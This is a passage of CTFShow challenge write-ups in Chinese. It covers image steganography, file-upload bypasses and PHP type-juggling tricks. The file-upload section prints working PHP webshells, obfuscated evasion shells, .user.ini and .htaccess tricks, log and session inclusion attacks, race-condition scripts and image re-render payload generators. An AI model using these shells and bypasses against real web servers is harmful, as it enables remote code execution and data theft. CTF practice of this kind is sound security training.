open(filename, &#x27;rb&#x27;) as f: all_b = f.read() data = bytearray(all_b[12:29]) n = 4095 for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) #替换成图片的crc if crc32result == 0x5255a798: print(&quot;宽为：&quot;, end = &#x27;&#x27;) print(width, end = &#x27; &#x27;) print(int.from_bytes(width, byteorder=&#x27;big&#x27;)) print(&quot;高为：&quot;, end = &#x27;&#x27;) print(height, end = &#x27; &#x27;) print(int.from_bytes(height, byteorder=&#x27;big&#x27;)) 宽为：bytearray(b’\\x00\\x00\\x03\\xd2’) 978高为：bytearray(b’\\x00\\x00\\x00\\x8e’) 142 1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于9001.36 misc351.37 misc361.38 misc37 — flag在图片里StegSolve 帧图分析 ctfshow{2056782cd57b13261dcbbe3d6eecda17} 1.39 misc38 — flag在图片里 使用浏览器打开，即可发现会动 APNG 图片分解器 ctfshow{48b722b570c603ef58cc0b83bbf7680d} 1.40 misc39 — flag就像水，忽快忽慢地流这题也是一个gif，不过这里是利用不同帧之间的间隔时间来隐写的。 1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠apng 帧分离，换成了apng的帧时间间隔隐写 1flag=&quot;&quot;for i in range(28,69): #flag内容从28位开始 f = open(&#x27;apngframe&#x27;+str(i)+&#x27;.txt&#x27;) s = f.read() flag += chr(int(s.split(&quot;/&quot;)[0][6:]))print(flag)","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-文件上传","slug":"CTF-Show-文件上传","date":"2021-10-01T11:16:29.000Z","updated":"2021-10-01T11:17:15.184Z","comments":true,"path":"2021/10/01/CTF-Show-文件上传/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"CTF Show 文件上传篇。","text":"CTF Show 文件上传篇。 CTF Show — 文件上传1.1 Web 151 — 前端验证 手动删除前端验证，好像没什么作用，尝试之后发现，只能成功上传 .png 图片，其实查看源代码后有 所以只能上传 .png ，我们上传 1.png 然后抓包手动修改 蚁剑连接即可 1.2 Web 1521后端不能单一校验 同上 1.3 Web 153 — .user.ini由于服务器是 nginx ，则可尝试上传 .user.ini 再上传 111.png 访问与 111.png 同目录下的 index.php 文件 即 /upload/index.php ，使用 蚁剑连接即可 1.4 Web 154 — 大小写绕过 php这次尝试之后发现进行了内容判断，只能使用图片木马 发现 .user.ini 仍旧可以上传 但是内容过滤了 php ,想办法找一些不含有 php 的一句话 1234567891011121314151617181920212223241:XML风格，也是官方推荐的形式&lt;?php @eval($_POST[1]);?&gt; 2:短标记&lt;? @eval($_POST[1]);?&gt;需要开启配置参数short_open_tags=on&lt;?= @eval($_POST[1]);自 PHP 5.4 起，短格式的 echo 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。&lt;? echo &#x27;123&#x27;;?&gt; //short_open_tags=on&lt;?=(表达式)?&gt; 等价于 &lt;?php echo (表达式)?&gt; //无限制3:ASP风格&lt;% @eval($_POST[1]); %&gt; ASP风格标记仅在通过php.ini配置文件中的指令asp_tags打开后才可用。&lt;% echo &#x27;123&#x27;;%&gt; //asp_tags=on php_version &lt; 74:脚本风格&lt;script language=&quot;php&quot;&gt; echo &quot;666&quot;;&lt;/script&gt; PHP 7.0.0以后失效 本题发现可以大小写进行绕过 蚁剑显示不出具体文件时，尝试进行终端查看 1# 过滤了 php，没过滤大小写 1.5 Web 155 — 短标签绕过 php1# 过滤了 php，过滤了大小写 同上 可使用短标签绕过 php 1.6 Web 156 — { } 代替 [ ]1# 过滤了 php，大小写，[]符号 之后同上 1.7 Web 157-159 — 命令执行1# 过滤了 php，大小写，[]，&#123;&#125;，; 转换思路，不上传一句话了，直接 命令执行 12345&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt; 1.8 Web 160 — 日志包含（过滤 log）1# 过滤了 php，大小写，[]，;，``，log 日志包含 条件 知道日志文件的路径 对日志文件可读 1# 上传 .user.iniauto_prepend_file=123.png# 上传 123.png# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt; 将 .user.ini 和 123.png 都成功上传之后，访问 /upload/index.php 抓包在 User-Agent 中添入代码，访问即可 1&lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; 流程 访问 /upload/index.php 由于 .user.ini 的配置，将首先自动包含文件 123.png 由于是 包含 文件 123.png ，将会自动执行其中的代码 即包含 /var/log/nginx/access.log 日志文件 而我们再在日志文件当中写入 恶意代码，就将会被执行 1.9 Web 161 — 文件头 GIF89a 写入无法上传 .user.ini 验证了图片内容，即必须包含文件头 在 Web 160 的基础上添加 文件头 GIF89a 或者是 PNG 图片的 文件幻术 1.10 Web 162-163 — session 文件包含继续使用上述 日志 包含，发现上传 .user.ini 时，文件内容 过滤掉了 . 过滤掉了 . session 包含 1# 上传 .user.iniGIF89aauto_prepend_file=test 1# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt; 构造 POST 数据包 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 任意上传一个文件，抓包修改，写入代码，进行爆破 然后访问 /upload/index.php 页面进行抓包，爆破 以上两个包同时进行爆破，得到 flag 流程 上传 .user.ini 上传 test 访问 /upload/index.php ，由于 .user.ini 的配置，首先包含 test 文件，紧接着执行其中代码，即包含 /tmp/sess_test 包含 sess_test ，即执行其中的 php 代码，即显示出 flag.php 1# 脚本# coding=utf-8import ioimport requestsimport threadingsessID = &#x27;test&#x27;url = &#x27;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&#x27;def write(session): while event.isSet(): f = io.BytesIO(b&#x27;a&#x27; * 256 * 1) response = session.post( url, cookies=&#123;&#x27;PHPSESSID&#x27;: sessID&#125;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125; )def read(session): while event.isSet(): response = session.get(url + &#x27;upload/index.php&#x27;.format(sessID)) if &#x27;flag&#x27; in response.text: print(response.text) event.clear() else: print(&#x27;[*]retrying...&#x27;)if __name__ == &#x27;__main__&#x27;: event = threading.Event() event.set() with requests.session() as session: for i in range(1, 30): threading.Thread(target=write, args=(session,)).start() for i in range(1, 30): threading.Thread(target=read, args=(session,)).start() 1# 条件竞争# coding=utf-8import requestsimport threadingsession=requests.session()sess=&#x27;test&#x27;url1=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&quot;url2=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/upload&quot;data1=&#123; &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;&#125;file=&#123; &#x27;file&#x27;:&#x27;test&#x27;&#125;cookies=&#123; &#x27;PHPSESSID&#x27;: sess&#125;def write(): while True: r = session.post(url1,data=data1,files=file,cookies=cookies)def read(): while True: r = session.get(url2) if &#x27;flag&#x27; in r.text: print(r.text) threads = [threading.Thread(target=write), threading.Thread(target=read)]for t in threads: t.start() 1.11 Web 164 — png 二次渲染1&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;1.png&#x27;);?&gt; 结果生成 1.png ，其中包含 &lt;?=$_GET[0]($_POST[1]);?&gt; 然后访问图片，执行代码后，下载图片查看 因为在下载的时候，看到 url 是 download/?image= ，可能是文件包含，所以可以执行我们的命令 1.12 Web 165 — jpg 二次渲染 首先准备一张 jpg 图片上传，成功后下载回来，使用如下脚本处理，生成一个新的图片马，再次上传 查看，即文件包含，保存到本地打开即可 1&lt;?php $miniPayload = &quot;&lt;?=`tac f*`?&gt;&quot;; //这里改代码 if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125; //使用方法 php exp.php 1.jpg?&gt; 1.13 Web 166 — zip 文件上传 1# Content-Type: application/x-zip-compressed 将一句话木马后缀更改为 zip 上传即可，查看文件 1/upload/download.php?file=9643f09dfc5004a1dc73f4c025f084d2.zip 将代码更改即可 1.14 Web 167 — .htaccess1httpd 尝试 jpg 文件成功上传之后发现服务器是 Apache ，再根据提示，尝试上传 .htaccess 成功上传 1# 上传 111.png&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt; 之后访问 /upload/111.png 蚁剑连接即可 1.15 Web 168 — 免杀代码1基础免杀# 过滤了 eval , system , $_POST , $_GET 等 1# 可使用反引号&lt;?=`ls /var/www/html`?&gt; #flag.php flagaa.php images index.php js layui upload upload.php &lt;?=`cat /var/www/html/flagaa.php`?&gt; 1# 其它绕过方式 1&lt;?php // 使用时请删除此行, 连接密码: TyKPuntU ?&gt;&lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#x27;bw==&#x27;).base64_decode(&#x27;bQ==&#x27;).base64_decode(&#x27;ZQ==&#x27;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#x27;YQ==&#x27;).base64_decode(&#x27;bA==&#x27;).chr(060340/01154).chr(01041-0775).base64_decode(&#x27;cw==&#x27;).str_rot13(&#x27;b&#x27;).chr(01504-01327).base64_decode(&#x27;ZQ==&#x27;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#x27;NjgxO&#x27;.&#x27;Tc7QG&#x27;.&#x27;V2QWw&#x27;.&#x27;oJF9Q&#x27;.&#x27;&#x27;.str_rot13(&#x27;G&#x27;).str_rot13(&#x27;1&#x27;).str_rot13(&#x27;A&#x27;).base64_decode(&#x27;VQ==&#x27;).str_rot13(&#x27;J&#x27;).&#x27;&#x27;.&#x27;&#x27;.chr(0x304-0x2d3).base64_decode(&#x27;Ug==&#x27;).chr(13197/249).str_rot13(&#x27;F&#x27;).base64_decode(&#x27;MQ==&#x27;).&#x27;&#x27;.&#x27;B1bnR&#x27;.&#x27;VXSk7&#x27;.&#x27;MjA0N&#x27;.&#x27;TkxOw&#x27;.&#x27;==&#x27;.&#x27;&#x27;));?&gt; 1&lt;?php$a = &quot;s#y#s#t#e#m&quot;;$b = explode(&quot;#&quot;,$a);$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];$c($_REQUEST[1]);?&gt; 1&lt;?php$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;$a($_REQUEST[1]);?&gt; 1&lt;?php$a=strrev(&#x27;metsys&#x27;);$a($_REQUEST[1]);?&gt; 1&lt;?php$a=$_REQUEST[&#x27;a&#x27;];$b=$_REQUEST[&#x27;b&#x27;];$a($b);?&gt; 1&lt;?=`$_REQUEST[1]`;?&gt;# 利用反引号执行系统命令 1&lt;?php $a=&#x27;syste&#x27;.&#x27;m&#x27;;($a)(&#x27;ls ../&#x27;);# 拼接 1&lt;?php$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;);# get传参 abs=system&amp;acos=ls# 数学函数 1.16 Web 169-170 — 日志包含（未过滤 log）1高级免杀 1# 前端做了 .zip 检查# 后端做了 Content-Type 检查 访问 1.php ，我们必须自己上传一个 .php 文件 1system(&#x27;ls ../&#x27;); 1system(&#x27;cat ../flagaa.php&#x27;); 二、总结 找到允许上传的文件类型，抓包 在 Content-Type 正确的情况下，首先尝试直接更改 后缀为 .php ，写入一句话木马 上述不允许的情况下，观察服务器类型，nginx 尝试 .user.ini ，Apache 尝试 .htaccess ```bash.user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log123+ ```bash # .htaccessAddType application/x-httpd-php .png # 特定文件后缀当作 php 文件处理AddHandler php5-script php # 包含关键字的文件名当作 php 文件处理&lt;FilesMatch &quot;文件名&quot;&gt; # 特定文件名当作 php 文件处理SetHandler application/x-httpd-php&lt;/FilesMatch&gt;SetHandler application/x-httpd-php #所有文件后缀都当作 php 文件处理 .user.ini 注意该目录下是否已经含有 .php 文件 过滤 php 1# 大小写绕过# 短标签 过滤 [] 1# &#123;&#125; 绕过 过滤 分号 ; 1# 命令执行&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt; 日志包含 1过滤 log Web 160# 上传 .user.iniauto_prepend_file=123.png# 上传 123.png，在其中进行拼接# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;# 访问 /upload/index.php 抓包在 User-Agent 中添加恶意代码 &lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; ，访问 1未过滤 log Web 169 170# 上传 .user.iniauto_prepend_file=/var/log/nginx/access.log# 上传 .php 文件，同时 User-Agent 写入 代码 &lt;?php phpinfo(); ?&gt;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;内容随意# 访问，命令执行 .user.ini 上传不了？尝试文件头写入 1GIF89a 过滤 . Web 162-163 1# 即不能包含日志文件，则包含 session 文件# 上传 .user.iniGIF89aauto_prepend_file=test# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;# 构造 POST 数据包&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# 任意上传文件，抓包修改，PHPSESSID=test，写入代码添入变量 Numbers 爆破# 访问 /upload/index.php 添入变量 Numbers 同时爆破 二次渲染 Web 164 165 1png 图片# 脚本生成图片上传，访问，命令执行 &lt;?=$_GET[0]($_POST[1]);?&gt;# 下载至本地查看（文件包含） 1jpg 图片# 直接上传 jpg 图片，下载回来，使用脚本处理，得到新的 jpg 图片，再次上传# 下载至本地查看（文件包含） 后缀类型不可猜测时，.zip 文件上传 Web 166 1# 上传 .zip 文件抓包 Content-Type: application/x-zip-compressed# 内容直接是恶意代码# 找到 .zip 文件路径，进行查看# 命令执行 免杀 Web 168 前端做后缀检测，后端做不同后缀的 Content-Type 检测 注意抓包后修改 Content-Type 为白名单","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-PHP特性","slug":"CTF-Show-PHP特性","date":"2021-10-01T11:15:08.000Z","updated":"2021-10-01T11:16:09.641Z","comments":true,"path":"2021/10/01/CTF-Show-PHP特性/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/","excerpt":"CTF Show PHP 特性篇。","text":"CTF Show PHP 特性篇。 一、CTF Show PHP特性1.1 Web 89 — intval 数组 [ ] 绕过12345678910111213&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 1?num[]=1 #数组绕过 1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===44761234567891011121314&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 12345678intval ( mixed $var [, int $base = 10 ] ) : intNote:如果 base 是 0，通过检测 var 的格式来决定使用的进制：如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。 123456intval(&#x27;4476.0&#x27;)===4476 小数点 intval(&#x27;+4476.0&#x27;)===4476 正负号intval(&#x27;4476e0&#x27;)===4476 科学计数法intval(&#x27;0x117c&#x27;)===4476 16进制intval(&#x27;010574&#x27;)===4476 8进制intval(&#x27; 010574&#x27;)===4476 8进制+空格 123if(intval(&#x27;4476sasaS&#x27;,0)===4476)&#123; echo &#x27;123&#x27;;&#125; 1?num=4476asd 1.3 Web 91 — 正则绕过 — /m 换行匹配1234567891011121314151617&lt;?phpshow_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono 1# 解析换行之后要匹配到 php不换行不能匹配到 php 1i 不区分(ignore)大小写m多(more)行匹配若存在换行\\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配$str = &quot;abc\\nabc&quot;;$preg = &quot;/^abc$/m&quot;;preg_match($preg, $str,$matchs);这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。s特殊字符圆点 . 中包含换行符默认的圆点 . 是匹配除换行符 \\n 之外的任何单字符，加上s之后, .包含换行符$str = &quot;abggab\\nacbs&quot;;$preg = &quot;/b./s&quot;;preg_match_all($preg, $str,$matchs);这样匹配到的有三个 bg b\\n bsA强制从目标字符串开头匹配;D如果使用$限制结尾字符,则不允许结尾有换行; e配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 1# 直接使用换行符号分割即可# %0a 是 换行符?cmd=%0aphp 1.4 Web 92 — intval 可解析十六进制、八进制1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 1?num=0x117c #十六进制 Hex?num=010574 #八进制 oct?num=%20010574# ?num=4476sqs 不行，由于 $num==4476 1.5 Web 93 — 八进制不含字母，十六进制含字母1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 1?num=010574 #oct 1.6 Web 94 — 正则绕过 — %20 %0a1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 1#0在其中的位置不能是0，即最开始，即不能以0开头?num=%0a010574?num=4476.0?num=%20010574 1.7 Web 95 — 正则绕过1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 1?num=%0a010574?num=%20010574?num=+010574 1.8 Web 96 — 路径书写1&lt;?php highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 1?u=./flag.php #路径?u=/var/www/html/flag.php?u=php://filter/resource=flag.php 1.9 Web 97 — md5 数组 [ ] 绕过 — if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; 1a[]=1&amp;b[]=2 1.10 Web 98 — 三目运算符、变量覆盖1&lt;?php include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; 1#三目运算符以及变量覆盖若GET传参，POST值将覆盖GET值 1get传参：?flag=1post传参：?HTTP_FLAG=flag 1.11 Web 99 — file_put_contents1&lt;?php highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123; file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; 1当没有第三个参数时，in_array之中的比较与 == 一致当第三个参数为 true 时，in_array之中的比较与 === 一致$allow = array(1,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型不同，首先转换，返回 true$allow = array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型一致，直接比较，返回false 1# payload?n=1.phpcontent=&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt; 访问 /1.php 1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);1&lt;?php highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\;/&quot;, $v2))&#123; if(preg_match(&quot;/\\;/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 测试： 1&lt;?phpvar_dump(true and true and false); // falsevar_dump(true and false and false);// falsevar_dump(true &amp;&amp; true &amp;&amp; false);// falsevar_dump(true &amp;&amp; false 